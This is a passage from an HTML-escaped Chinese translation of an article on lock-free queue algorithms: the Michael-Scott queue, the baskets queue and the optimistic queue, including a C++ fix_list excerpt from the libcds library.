				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0135 seconds] --&gt;
&lt;p&gt;正如大家所看到的，队列由一个有头有尾的单链表组成。&lt;/p&gt;
&lt;p&gt;算法的核心是什么呢？通过常规的CAS控制两个指针——这俩指针分别指向头部的和尾部。实际上得到的队列永远不为空。查看代码，是否有任何一处对头和尾做了nullptr检查？没有吧。非空的队列构造器中，添加哑元素（dummy element）给它，作为头和尾。出队返回一个元素，该元素作为一个新的头哑元素，其前面的哑元素被移除。&lt;/p&gt;
&lt;p&gt;（译者注：所谓哑元素，仅是为了占一个位置，让链表永远不为空，从而简化判断的边缘条件，其数据部分没有任何意义）&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;alignnone size-medium wp-image-55321&quot; src=&quot;/images/jobbole.com/5cc2541751308783bb0a6c35190bf904.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;在设计侵入式队列时必须考虑，返回指针是队列的一部分，仅在下一次出队时可以移除它。&lt;/p&gt;
&lt;p&gt;其次，算法假定尾部指针不指向最后一个元素。每一次读取尾部，需检查尾部是否包含下一个m_pNext元素。倘若该指针不为nullptr&lt;span style=&quot;color: #ff0000;&quot;&gt;，&lt;/span&gt;说明tail位置不对，应该后移。但这里有另外一个陷阱：或许tail会指向head前面的元素。为了避免这一点，出队方法中对m_pTail-&amp;gt;m_pNext做了隐式地检查：先读取head，m_pHead-&amp;gt;m_pNext元素紧随其后，确保pNext != nullptr。接着看到head等于tail，tail后面必然还有元素，即pNext，此时应该后移tail。这是一个典型的线程互助案例，它在无锁编程中很常见。&lt;/p&gt;
&lt;p&gt;2000年，小范围的算法优化被提出&lt;span style=&quot;color: #ff0000;&quot;&gt;。&lt;/span&gt;该观点认为出队方法中的MSQueue算法，在每一次的循环迭代中，读取tail是没有必要的；只有在成功更新head时，才有必要读取tail，验证tail是否真的指向最后一个元素。因此，可以在某种程度上减少加载m_pTail的压力。这个优化参见libcds库中的cds::intrusive::MoirQueue类。&lt;/p&gt;
&lt;h2&gt;菜篮队列&lt;/h2&gt;
&lt;p&gt;2007年，一个MSQueue有趣的&lt;a href=&quot;http://people.csail.mit.edu/shanir/publications/Baskets%20Queue.pdf&quot;&gt;变体&lt;/a&gt;被引入。无锁领域久负盛名的研究者Nir Shavit和他的助理们，采用不同的方法优化了Michael和Scott经典的无锁队列。&lt;/p&gt;
&lt;p&gt;Nir Shavit将队列作为一组逻辑菜篮，短时间内，每一个都可以插入一个新元素。一旦这个时间点过了，一个新的菜篮就会被创建。&lt;br&gt;
&lt;img class=&quot;alignnone size-medium wp-image-55323&quot; src=&quot;/images/jobbole.com/954024e73d2f513b1c75d259b2529d23.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;每个菜篮包含一组无序元素，这种定义看似违反了队列-FIFO的基本特性；也就是说队列变成了非公平。FIFO是针对菜篮的，而非菜篮中的元素。倘若菜篮用来插入的时间段非常短暂，我们可以忽视菜篮中无序项。（译者注：时间短意味着，没放几个就创建了新的菜篮，因此可以近似地看做是FIFO）&lt;/p&gt;
&lt;p&gt;如何确定时间段的长短呢？菜篮队列作者认为，实际上，无需确定该时间短长短。让我们回头看一眼MSQueue队列，在入队运算中（enqueue），当并发很高时，CAS改变尾部（tail）无法正常工作；这就是为什么在MSQueue调用回退（back-off）的原因，在并发情况下加入元素，无法保证队列中元素项的排序。就是这个逻辑菜篮。正好说明，抽象的逻辑菜篮就是一种回退策略。&lt;/p&gt;
&lt;p&gt;在此，我不想过多地谈论代码实现，因此就不提供具体代码了。MSQueue例子已经很好的向我阐述了，无锁代码确实相当的简洁。有计划查看代码实现的，请参看libcds库中cds::intrusive::BasketQueue类，cds/intrusive/basket_queue.h文件。同时，为了解释本算法，我从Nir Shavit及其同事的工作中拷贝了另一张图：&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;alignnone size-medium wp-image-55330&quot; src=&quot;/images/jobbole.com/a78f6521bee01a7712325a54b3aae3a1.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;1、A、B、C三个线程打算往队列中插入项。它们看到尾部（tail）在正确的位置，并试图并发改变tail（还记得在MSQueue中，尾部（tail）可以不指向队列中最后的元素）。&lt;br&gt;
2、A线程获胜，成功插入一个新项。B和C则失败了——它们的tail的CAS运算没有成功执行。因此&lt;span style=&quot;color: #ff0000;&quot;&gt;，&lt;/span&gt;它俩开始基于之前的读到的tail旧值，往菜篮中插入各自的项。&lt;br&gt;
3、B线程先一步成功插入，与此同时，D线程调用入队（enqueue），成功完成项插入，并改变了尾部（tail）。&lt;br&gt;
4、C线程此后也完成了插入，请看，它将项插入队列中间位置。在这个插入过程中，C使用的指向旧tail的指针，在线程进入运算但未成功执行CAS时，就已经读取此指针了。&lt;/p&gt;
&lt;p&gt;需要注意的是，在插入过程中，插入项可能被放入队列head前面。比如图NR 4中C前面的项：当C线程执行入队（enqueue）时，其它线程删除C前面的项。（译者注，旧的头部被删除了）&lt;br&gt;
为了防止此类情形出现，建议采用逻辑删除，即用一个特殊删除标签标记待删除元素。这就要求指向项的标签和指针必须为原子性读取，我们在指向pNext项指针的最低有效位（lsb）中存入此标签。这是可以接受的，现代系统中内存分配都是以4个字节对齐，因为指针最低有效位的2个比特一直为零。所以我们创造了标记指针方法，该方法被广泛地应用于无锁数据结构中。当然未来我们会多次碰到此方法。应用逻辑删除，即在CAS帮助下，将pNext最低位比特值设为1，这样就可以避免插入项在head前面的情形出现。这样插入依旧由CAS来完成，与此同时，待删除项在最低位值为1.因此，CAS可能会失败。（当然，在插入项时，我们无需获取整个标记指针，只有最高有效位（msb）包含地址；我们假定最低有效位等于零）。&lt;/p&gt;
&lt;p&gt;菜篮队列最后一项改进是删除项实体，据观察，在每次成功调用出队时，改变头部令人不爽，因为CAS会被调用，正如你所知道的那样，这个操作太笨重了。因此，我们仅在存在好几个逻辑删除元素之后，才会改变头部。（在libcds库中，缺省值是三）。同样，当队列为空时，我们也可以改变头部（head）。可以说，在菜篮队列中，头部是变化跳动的。&lt;/p&gt;
&lt;p&gt;所有对经典无锁队列优化设计都是在高并发这个背景下展开的。&lt;/p&gt;
&lt;h2&gt;乐观方式&lt;/h2&gt;
&lt;p&gt;2004年 Nir Shavit和Edya Ladan Mozes在MSQueue引入另一种叫做&lt;a href=&quot;http://people.csail.mit.edu/edya/publications/OptimisticFIFOQueue-journal.pdf&quot;&gt;乐观的优化方式&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;alignnone size-medium wp-image-55332&quot; src=&quot;/images/jobbole.com/68569b8f86461e1b4bad4290ce7b25b8.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;他们注意到Michael和Scott的算法中，出队运算仅需要一个CAS，而入队需要两个CAS，如上图所示。&lt;/p&gt;
&lt;p&gt;而入队中第二个CAS甚至在低加载时。能显著降低性能，因为在现代处理器中，CAS是一个相当重量级运算。是否在某种程度上可以处理掉这个不足呢？&lt;/p&gt;
&lt;p&gt;试想MSQueue::enqueue中存在两个CAS会怎样？第一个CAS添加新项到tail&lt;span style=&quot;color: #ff0000;&quot;&gt;，&lt;/span&gt;使得pTail-&amp;gt;pNext。第二个CAS将尾部向后移动。那么可否用一个原子性记录而非CAS改变pNext字段呢？确实可以，假定单链表的方向与以往不一样，并非从头到尾，而是从尾到头。因此可以采用原子性store（pNew-&amp;gt;pNext = pTail）完成pNew-&amp;gt;pNext任务，接着再通过CAS改变pTail。不过一旦改变了单链表方向，接下来如何进行出队运算呢？因为方向改变，pHead-&amp;gt;pNext 必然不会存在了。&lt;/p&gt;
&lt;p&gt;乐观队列作者建议改用一个双链表。&lt;/p&gt;
&lt;p&gt;但问题是，针对CAS的无锁双链表有效算法迄今还未可知。已知的算法有DCAS，但没有对应的硬件实现。针对CAS的MCAS（CAS for M unbounded memory cells）仿真算法，但没那么有效（需要2M + 1 CAS），充其量就是一个理论的玩意。&lt;/p&gt;
&lt;p&gt;作者给出了以下方法：链表从尾部到头部的链接依旧是一致的（队列中并不需要next链接，但它可以处理入队第一个CAS）。正是由于从头到尾相反的方向，最重要的链接-prev-并不能真正的一致，意味着允许出现这种违例的。找出此类违例，我们就可以重建正确的表，放在next引用后面。如何检测此类违例了？事实上，这个相当简单：pHead-&amp;gt;prev-&amp;gt;next != pHead。如果这个不等在出队（dequeue）被发现， fix_list这个辅助处理过程就会被调用。&lt;/p&gt;
&lt;p&gt;摘自libcds库cds::intrusive::OptimisticQueue类&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9f471b0e5139975534&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;C++&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
void fix_list( node_type * pTail, node_type * pHead )
{            
   // pTail and pHead are already protected by Hazard Pointers
   node_type * pCurNode;
   node_type * pCurNodeNext;
   typename gc::template GuardArray&amp;lt;2&amp;gt; guards;
   pCurNode = pTail;
   while ( pCurNode != pHead ) { // Till we reach the head
     pCurNodeNext = guards.protect(0, pCurNode-&amp;gt;m_pNext, node_to_value() );
     if ( pHead != m_pHead.load(std::memory_order_relaxed) )
         break;
     pCurNodeNext-&amp;gt;m_pPrev.store( pCurNode, std::memory_order_release );
     guards.assign( 1, node_traits::to_value_ptr( pCurNode = pCurNodeNext ));
   }
}&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0e5139975534-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0e5139975534-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0e5139975534-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0e5139975534-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0e5139975534-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0e5139975534-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0e5139975534-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0e5139975534-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0e5139975534-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0e5139975534-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0e5139975534-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0e5139975534-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0e5139975534-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9f471b0e5139975534-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9f471b0e5139975534-15&quot;&gt;15&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0e5139975534-1&quot;&gt;
&lt;span class=&quot;crayon-t&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;fix_list&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;node_type&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pTail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;node_type&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;pHead&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0e5139975534-2&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;            &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0e5139975534-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// pTail and pHead are already protected by Hazard Pointers&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0e5139975534-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;node_type&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pCurNode&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0e5139975534-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;node_type&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pCurNodeNext&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0e5139975534-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;typename&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;gc&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;GuardArray&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;guards&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0e5139975534-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pCurNode&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pTail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0e5139975534-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pCurNode&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;pHead&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// Till we reach the head&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0e5139975534-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pCurNodeNext&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;guards&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;protect&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pCurNode&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m_pNext&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;node_to_value&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0e5139975534-10&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pHead&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m_pHead&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;memory_order_relaxed&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0e5139975534-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;         &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0e5139975534-12&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pCurNodeNext&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;m_pPrev&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;store&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pCurNode&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;memory_order&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;_&lt;/span&gt;release&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0e5139975534-13&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;guards&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;assign&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;node_traits&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;to_value_ptr&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pCurNode&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;pCurNodeNext&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f471b0e5139975534-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f471b0e5139975534-15&quot;&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0038 seconds] --&gt;
&lt;p&gt;fix_list从队列的尾查至头，用正确的pNext引用，正确的pPrev。&lt;/p&gt;
&lt;p&gt;列表从头至尾的违例也是有可能的，更多的是因为延迟，而非重加载。延迟是因为操作系统替换或线程中断。具体请看 OptimisticQueue::enqueue中的代码：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9f471b0e9356589769&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
